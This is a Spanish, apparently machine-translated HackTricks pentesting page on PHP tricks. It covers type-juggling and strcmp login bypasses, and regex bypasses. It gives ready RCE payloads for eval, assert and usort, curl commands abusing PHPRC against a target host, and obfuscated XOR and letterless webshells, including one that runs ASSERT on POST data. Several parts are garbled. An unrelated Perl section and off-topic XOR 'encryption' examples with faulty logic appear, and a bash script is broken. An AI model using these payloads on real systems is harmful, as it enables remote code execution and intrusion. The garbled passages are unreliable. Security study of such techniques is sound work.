# Trucos de PHP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Ubicaci√≥n com√∫n de las cookies:

Esto tambi√©n es v√°lido para las cookies de phpMyAdmin.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Ubicaciones:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Bypassando comparaciones en PHP

### Comparaciones d√©biles/Type Juggling ( == )

Si se utiliza `==` en PHP, hay casos inesperados donde la comparaci√≥n no se comporta como se espera. Esto se debe a que "==" solo compara valores transformados al mismo tipo, si tambi√©n quieres comparar que el tipo de los datos comparados sea el mismo, debes usar `===`.

Tablas de comparaci√≥n en PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Una cadena que no comienza con un n√∫mero es igual a un n√∫mero
* `"0xAAAA" == "43690" -> True` Cadenas compuestas por n√∫meros en formato decimal o hexadecimal se pueden comparar con otros n√∫meros/cadenas con un resultado True si los n√∫meros son iguales (los n√∫meros en una cadena se interpretan como n√∫meros)
* `"0e3264578" == 0 --> True` Una cadena que comienza con "0e" y seguida de cualquier cosa ser√° igual a 0
* `"0X3264578" == 0X --> True` Una cadena que comienza con "0" y seguida de cualquier letra (X puede ser cualquier letra) y seguida de cualquier cosa ser√° igual a 0
* `"0e12334" == "0" --> True` Esto es muy interesante porque en algunos casos puedes controlar la entrada de cadena de "0" y alg√∫n contenido que se est√° hasheando y se compara con √©l. Por lo tanto, si puedes proporcionar un valor que crear√° un hash que comienza con "0e" y sin ninguna letra, podr√≠as eludir la comparaci√≥n. Puedes encontrar **cadenas ya hasheadas** con este formato aqu√≠: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Cualquier letra en una cadena es igual a int 0

M√°s informaci√≥n en [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** tambi√©n afecta a la funci√≥n `in_array()` de forma predeterminada (necesitas establecer en verdadero el tercer argumento para hacer una comparaci√≥n estricta):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Si esta funci√≥n se utiliza para **cualquier verificaci√≥n de autenticaci√≥n** (como verificar la contrase√±a) y el usuario controla uno de los lados de la comparaci√≥n, puede enviar un array vac√≠o en lugar de una cadena como valor de la contrase√±a (`https://example.com/login.php/?username=admin&password[]=`) y evadir esta verificaci√≥n:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
El mismo error ocurre con `strcasecmp()`

### Conversi√≥n estricta de tipos

Incluso si se utiliza `===`, puede haber errores que hacen que la comparaci√≥n sea vulnerable a la conversi√≥n de tipos. Por ejemplo, si la comparaci√≥n est√° convirtiendo los datos a un tipo de objeto diferente antes de comparar:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** se puede utilizar para **validar la entrada del usuario** (verifica si alguna **palabra/regex** de una **lista negra** est√° **presente** en la **entrada del usuario** y si no lo est√°, el c√≥digo puede continuar su ejecuci√≥n).

#### Bypass de nueva l√≠nea

Sin embargo, al delimitar el inicio de la expresi√≥n regular, `preg_match()` **solo verifica la primera l√≠nea de la entrada del usuario**, por lo que si de alguna manera puedes **enviar** la entrada en **varias l√≠neas**, podr√≠as ser capaz de evadir esta verificaci√≥n. Ejemplo:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Para evadir esta verificaci√≥n podr√≠as **enviar el valor con saltos de l√≠nea urlencoded** (`%0A`) o si puedes enviar **datos JSON**, env√≠alos en **varias l√≠neas**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Encuentra un ejemplo aqu√≠: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Bypass de error de longitud**

(Este bypass fue probado aparentemente en PHP 5.2.5 y no pude hacerlo funcionar en PHP 7.3.15)\
Si puedes enviar a `preg_match()` una entrada **muy grande y v√°lida**, no podr√° **procesarla** y podr√°s **burlar** la verificaci√≥n. Por ejemplo, si est√° en una lista negra un JSON, podr√≠as enviar:
```
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000000 + '"}'
```
### Type Juggling para la ofuscaci√≥n en PHP

Type juggling es una t√©cnica utilizada en PHP para ofuscar el c√≥digo y dificultar su comprensi√≥n. Esta t√©cnica se basa en la conversi√≥n autom√°tica de tipos de datos en operaciones aritm√©ticas y de comparaci√≥n.

En PHP, los tipos de datos se pueden convertir autom√°ticamente seg√∫n el contexto en el que se utilicen. Esto significa que un valor puede ser interpretado como un tipo de dato diferente dependiendo de c√≥mo se utilice en una operaci√≥n.

Por ejemplo, consideremos la siguiente expresi√≥n:

```php
if ("0e123" == "0e321") {
    echo "Son iguales";
} else {
    echo "No son iguales";
}
```

En este caso, PHP interpretar√° las cadenas "0e123" y "0e321" como n√∫meros en notaci√≥n cient√≠fica, lo que resultar√° en una comparaci√≥n verdadera y se imprimir√° "Son iguales".

Este comportamiento puede ser aprovechado por los atacantes para ofuscar el c√≥digo y evadir ciertas validaciones. Por ejemplo, un atacante podr√≠a manipular los par√°metros de una solicitud HTTP para enga√±ar a una aplicaci√≥n y obtener acceso no autorizado.

Es importante tener en cuenta que el type juggling no es una vulnerabilidad en s√≠ misma, sino una t√©cnica que puede ser utilizada para explotar vulnerabilidades existentes en una aplicaci√≥n.

Para protegerse contra este tipo de ataques, es recomendable utilizar comparaciones estrictas (===) en lugar de comparaciones d√©biles (==) y validar y sanitizar adecuadamente todas las entradas de usuario.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Ejecutar despu√©s de la Redirecci√≥n (EAR)

Si PHP redirige a otra p√°gina pero no se llama a la funci√≥n **`die`** o **`exit`** despu√©s de establecer la cabecera `Location`, PHP contin√∫a ejecut√°ndose y agregando los datos al cuerpo:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## M√°s trucos

* **register\_globals**: En **PHP < 4.1.1.1** o si est√° mal configurado, **register\_globals** puede estar activo (o su comportamiento se est√° imitando). Esto implica que en variables globales como $\_GET si tienen un valor, por ejemplo $\_GET\["param"]="1234", puedes acceder a √©l a trav√©s de **$param**. Por lo tanto, al enviar par√°metros HTTP puedes sobrescribir variables que se utilizan en el c√≥digo.
* Las **cookies PHPSESSION del mismo dominio se almacenan en el mismo lugar**, por lo tanto, si dentro de un dominio se utilizan **cookies diferentes en diferentes rutas**, puedes hacer que una ruta **acceda a la cookie de la otra ruta** estableciendo el valor de la cookie de la otra ruta. De esta manera, si **ambas rutas acceden a una variable con el mismo nombre**, puedes hacer que el **valor de esa variable en la ruta1 se aplique a la ruta2**. Y luego la ruta2 considerar√° v√°lidas las variables de la ruta1 (d√°ndole a la cookie el nombre que le corresponde en la ruta2).
* Cuando tienes los **nombres de usuario** de los usuarios de la m√°quina, verifica la direcci√≥n: **/\~\<USERNAME>** para ver si los directorios php est√°n activados.
* [**LFI y RCE utilizando envoltorios php**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Estas funciones se utilizan t√≠picamente en PHP para **generar hashes a partir de contrase√±as** y para **verificar** si una contrase√±a es correcta en comparaci√≥n con un hash.\
Los algoritmos admitidos son: `PASSWORD_DEFAULT` y `PASSWORD_BCRYPT` (comienza con `$2y$`). Ten en cuenta que **PASSWORD\_DEFAULT** suele ser lo mismo que PASSWORD\_BCRYPT. Y actualmente, **PASSWORD\_BCRYPT** tiene una **limitaci√≥n de tama√±o en la entrada de 72 bytes**. Por lo tanto, cuando intentas generar un hash de algo m√°s grande que 72 bytes con este algoritmo, solo se utilizar√°n los primeros 72 bytes:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Bypass de encabezados HTTP abusando de errores de PHP

Si una **p√°gina PHP est√° imprimiendo errores y devolviendo alg√∫n dato proporcionado por el usuario**, el usuario puede hacer que el servidor PHP devuelva alg√∫n **contenido lo suficientemente largo** para que, al intentar **agregar los encabezados** a la respuesta, el servidor genere un error.\
En el siguiente escenario, el **atacante hizo que el servidor generara grandes errores**, y como se puede ver en la captura de pantalla, cuando PHP intent√≥ **modificar la informaci√≥n del encabezado, no pudo** (por lo tanto, por ejemplo, el encabezado CSP no se envi√≥ al usuario):

![](<../../../.gitbook/assets/image (465).png>)

## Ejecuci√≥n de c√≥digo

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Consulta esto para obtener m√°s funciones √∫tiles de PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Para ejecutar el c√≥digo en el argumento "replace" se necesita al menos una coincidencia.\
Esta opci√≥n de preg_replace ha sido **desaprobada a partir de PHP 5.5.0.**

### **RCE a trav√©s de Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE a trav√©s de Assert()**

Esta funci√≥n en php te permite **ejecutar c√≥digo que est√° escrito en una cadena** para **devolver verdadero o falso** (y dependiendo de esto, alterar la ejecuci√≥n). Por lo general, la variable del usuario se insertar√° en medio de una cadena. Por ejemplo:\
`assert("strpos($_GET['page']),'..') === false")` --> En este caso, para obtener **RCE**, podr√≠as hacer:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Necesitar√°s **romper** la **sintaxis** del c√≥digo, **a√±adir** tu **payload** y luego **arreglarlo de nuevo**. Puedes usar operaciones l√≥gicas como "**and" o "%26%26" o "|"**. Ten en cuenta que "or" y "||" no funcionan porque si la primera condici√≥n es verdadera, nuestro payload no se ejecutar√°. De la misma manera, ";" no funciona ya que nuestro payload no se ejecutar√°.

**Otra opci√≥n** es agregar a la cadena la ejecuci√≥n del comando: `'.highlight_file('.passwd').'`

**Otra opci√≥n** (si tienes el c√≥digo interno) es modificar alguna variable para alterar la ejecuci√≥n: `$file = "hola"`

### **RCE a trav√©s de usort()**

Esta funci√≥n se utiliza para ordenar una matriz de elementos utilizando una funci√≥n espec√≠fica.\
Para abusar de esta funci√≥n:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Tambi√©n puedes usar **//** para comentar el resto del c√≥digo.

Para descubrir el n√∫mero de par√©ntesis que necesitas cerrar:

* `?order=id;}//`: obtenemos un mensaje de error (`Error de an√°lisis: error de sintaxis, ';' inesperado`). Probablemente nos falte uno o m√°s corchetes.
* `?order=id);}//`: obtenemos una **advertencia**. Eso parece correcto.
* `?order=id));}//`: obtenemos un mensaje de error (`Error de an√°lisis: error de sintaxis, ')' inesperado`). Probablemente tengamos demasiados corchetes de cierre.

### **RCE a trav√©s de .httaccess**

Si puedes **subir** un **.htaccess**, entonces puedes **configurar** varias cosas e incluso ejecutar c√≥digo (configurando que los archivos con extensi√≥n .htaccess se pueden **ejecutar**).

Se pueden encontrar diferentes shells .htaccess [aqu√≠](https://github.com/wireghoul/htshells)

### RCE a trav√©s de Variables de Entorno

Si encuentras una vulnerabilidad que te permite **modificar variables de entorno en PHP** (y otra para subir archivos, aunque con m√°s investigaci√≥n tal vez se pueda eludir), podr√≠as abusar de este comportamiento para obtener **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Esta variable de entorno te permite cargar bibliotecas arbitrarias al ejecutar otros binarios (aunque en este caso puede que no funcione).
* **`PHPRC`** : Instruye a PHP sobre **d√≥nde ubicar su archivo de configuraci√≥n**, generalmente llamado `php.ini`. Si puedes subir tu propio archivo de configuraci√≥n, entonces usa `PHPRC` para indicarle a PHP d√≥nde est√°. Agrega una entrada **`auto_prepend_file`** especificando un segundo archivo subido. Este segundo archivo contiene c√≥digo PHP normal, que luego es ejecutado por el tiempo de ejecuci√≥n de PHP antes que cualquier otro c√≥digo.
1. Sube un archivo PHP que contenga nuestro c√≥digo de shell
2. Sube un segundo archivo que contenga una directiva **`auto_prepend_file`** que instruya al preprocesador de PHP a ejecutar el archivo que subimos en el paso 1
3. &#x20;Establece la variable `PHPRC` en el archivo que subimos en el paso 2.
* Obt√©n m√°s informaci√≥n sobre c√≥mo ejecutar esta cadena [**desde el informe original**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - otra opci√≥n
* Si **no puedes subir archivos**, puedes usar en FreeBSD el "archivo" `/dev/fd/0` que contiene el **`stdin`**, siendo el **cuerpo** de la solicitud enviada al `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* O para obtener RCE, habilita **`allow_url_include`** y agrega un archivo con **c√≥digo PHP en base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* T√©cnica [**de este informe**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## An√°lisis est√°tico de PHP

Verifica si puedes insertar c√≥digo en llamadas a estas funciones (desde [aqu√≠](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Si est√°s depurando una aplicaci√≥n PHP, puedes habilitar la impresi√≥n de errores globalmente en `/etc/php5/apache2/php.ini` agregando `display_errors = On` y reiniciar Apache: `sudo systemctl restart apache2`

### Desofuscando c√≥digo PHP

Puedes utilizar el **sitio web** [**www.unphp.net**](http://www.unphp.net) **para desofuscar c√≥digo PHP.**

## Wrappers y protocolos de PHP

Los wrappers y protocolos de PHP podr√≠an permitirte **burlar las protecciones de escritura y lectura** en un sistema y comprometerlo. Para [**m√°s informaci√≥n, consulta esta p√°gina**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## RCE no autenticado de Xdebug

Si ves que **Xdebug** est√° **habilitado** en la salida de `phpconfig()`, debes intentar obtener RCE a trav√©s de [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Variables variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE abusando de $\_GET\["a"]\($\_GET\["b"])

Si en una p√°gina puedes **crear un nuevo objeto de una clase arbitraria**, es posible que puedas obtener RCE, consulta la siguiente p√°gina para aprender c√≥mo:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Ejecutar PHP sin letras

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Usando octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

El operador XOR (Exclusive OR) es una operaci√≥n l√≥gica que se utiliza en la programaci√≥n para comparar dos valores booleanos. Devuelve `true` si uno y solo uno de los valores es `true`, y `false` en cualquier otro caso.

En el contexto de la programaci√≥n web, el operador XOR se puede utilizar para realizar ciertos trucos en PHP. A continuaci√≥n, se presentan algunos ejemplos de c√≥mo se puede utilizar el operador XOR en PHP:

#### **1. Encriptaci√≥n simple**

El operador XOR se puede utilizar para realizar una encriptaci√≥n simple en PHP. Aqu√≠ hay un ejemplo de c√≥mo se puede utilizar:

```php
$mensaje = "Hola mundo";
$clave = "secreto";

$mensaje_encriptado = $mensaje ^ $clave;
echo $mensaje_encriptado;
```

En este ejemplo, el operador XOR se utiliza para encriptar el mensaje utilizando una clave secreta. El mensaje encriptado se almacena en la variable `$mensaje_encriptado` y se muestra en la pantalla.

#### **2. Ocultar informaci√≥n sensible**

El operador XOR tambi√©n se puede utilizar para ocultar informaci√≥n sensible en PHP. Aqu√≠ hay un ejemplo de c√≥mo se puede utilizar:

```php
$informacion_sensible = "1234567890";
$clave = "secreto";

$informacion_oculta = $informacion_sensible ^ $clave;
echo $informacion_oculta;
```

En este ejemplo, el operador XOR se utiliza para ocultar la informaci√≥n sensible utilizando una clave secreta. La informaci√≥n oculta se almacena en la variable `$informacion_oculta` y se muestra en la pantalla.

#### **3. Verificaci√≥n de integridad**

El operador XOR tambi√©n se puede utilizar para verificar la integridad de los datos en PHP. Aqu√≠ hay un ejemplo de c√≥mo se puede utilizar:

```php
$datos_originales = "Lorem ipsum dolor sit amet";
$datos_modificados = "Lorem ipsum dolor sit amet";

$resultado = $datos_originales ^ $datos_modificados;

if ($resultado == 0) {
    echo "Los datos no han sido modificados";
} else {
    echo "Los datos han sido modificados";
}
```

En este ejemplo, el operador XOR se utiliza para comparar los datos originales con los datos modificados. Si el resultado es igual a cero, significa que los datos no han sido modificados. De lo contrario, significa que los datos han sido modificados.

El operador XOR es una herramienta √∫til en la programaci√≥n web y puede ser utilizado de diversas formas para realizar trucos y operaciones l√≥gicas en PHP.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### C√≥digo de shell XOR f√°cil

Seg√∫n [**este art√≠culo**](https://mgp25.com/ctf/Web-challenge/), es posible generar un c√≥digo de shell f√°cil de esta manera:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Entonces, si puedes **ejecutar PHP arbitrario sin n√∫meros y letras**, puedes enviar una solicitud como la siguiente abusando de esa carga √∫til para ejecutar PHP arbitrario:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Para obtener una explicaci√≥n m√°s detallada, consulta [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### C√≥digo de Shell XOR (dentro de eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl como

Perl es un lenguaje de programaci√≥n vers√°til y potente que se utiliza ampliamente en el desarrollo web. Aunque PHP es el lenguaje m√°s com√∫nmente utilizado para el desarrollo web, hay algunas caracter√≠sticas de Perl que pueden ser √∫tiles para los desarrolladores de PHP. En este documento, exploraremos algunas t√©cnicas de Perl que se pueden aplicar en el desarrollo de PHP.

#### Expresiones regulares

Las expresiones regulares son una caracter√≠stica poderosa de Perl que tambi√©n est√° disponible en PHP. Las expresiones regulares permiten buscar y manipular patrones de texto en cadenas. En Perl, las expresiones regulares se delimitan con barras diagonales, como `/patr√≥n/`. En PHP, las expresiones regulares se pueden delimitar con barras diagonales o con comillas, como `'/patr√≥n/'` o `"/patr√≥n/"`. Las expresiones regulares en Perl y PHP son similares en su sintaxis y funcionalidad, lo que facilita la transici√≥n entre los dos lenguajes.

#### Variables especiales

Perl tiene varias variables especiales que contienen informaci√≥n √∫til durante la ejecuci√≥n del programa. Estas variables incluyen `$_`, que contiene la √∫ltima cadena procesada por una expresi√≥n regular, y `@_`, que contiene los argumentos pasados a una funci√≥n. En PHP, tambi√©n hay variables especiales similares disponibles, como `$GLOBALS`, que contiene todas las variables globales, y `$_SERVER`, que contiene informaci√≥n sobre el servidor y el entorno de ejecuci√≥n. El uso de estas variables especiales puede facilitar el desarrollo y la depuraci√≥n de aplicaciones PHP.

#### Funciones de manipulaci√≥n de cadenas

Perl tiene una amplia gama de funciones para manipular cadenas de texto, como `substr`, `index`, `length`, `split`, entre otras. Estas funciones permiten realizar operaciones comunes en cadenas, como extraer una subcadena, buscar la posici√≥n de un car√°cter o dividir una cadena en partes m√°s peque√±as. En PHP, tambi√©n hay funciones similares disponibles, como `substr`, `strpos`, `strlen`, `explode`, que se pueden utilizar para manipular cadenas de texto de manera eficiente.

#### M√≥dulos CPAN

CPAN (Comprehensive Perl Archive Network) es un repositorio de m√≥dulos de Perl que proporciona una amplia gama de funcionalidades adicionales para el desarrollo de aplicaciones. Estos m√≥dulos se pueden instalar f√°cilmente en Perl utilizando el administrador de paquetes `cpan`. Aunque PHP no tiene un equivalente directo de CPAN, hay muchos paquetes y bibliotecas disponibles a trav√©s de Composer, el administrador de paquetes de PHP. Al utilizar m√≥dulos y paquetes adicionales, los desarrolladores de PHP pueden ampliar la funcionalidad de sus aplicaciones y acelerar el desarrollo.

En resumen, aunque PHP es el lenguaje de programaci√≥n m√°s com√∫nmente utilizado para el desarrollo web, hay algunas caracter√≠sticas de Perl que pueden ser √∫tiles para los desarrolladores de PHP. Las expresiones regulares, las variables especiales, las funciones de manipulaci√≥n de cadenas y los m√≥dulos CPAN son algunas de las caracter√≠sticas de Perl que se pueden aplicar en el desarrollo de PHP para mejorar la eficiencia y la funcionalidad de las aplicaciones.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
